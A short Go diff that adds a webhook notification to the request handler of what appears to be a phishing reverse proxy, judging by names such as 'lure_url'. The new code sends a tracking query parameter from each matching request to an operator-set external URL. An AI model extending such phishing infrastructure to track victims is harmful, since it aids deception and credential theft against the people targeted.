@@ -81,6 +81,22 @@ type ProxySession struct {
 	Index       int
 }
 
+func (p *HttpProxy) NotifyWebhook(url *url.URL) {
+	query := url.Query()
+	if p.cfg.webhookParam == "" {
+		return
+	}
+	if query[p.cfg.webhookParam] == nil {
+		return
+	}
+
+	webhookURL := fmt.Sprintf("%s/?%s=%s", p.cfg.webhookUrl, p.cfg.webhookParam, query[p.cfg.webhookParam][0])
+	_, err := http.Get(webhookURL)
+	if err != nil {
+		log.Error("webhook: %v", err)
+	}
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -159,6 +175,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				return p.blockRequest(req)
 			}
 
+			p.NotifyWebhook(req.URL)
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			lure_url := req_url
 			req_path := req.URL.Path
@@ -1548,3 +1565,4 @@ func orPanic(err error) {
 		panic(err)
 	}
 }
+
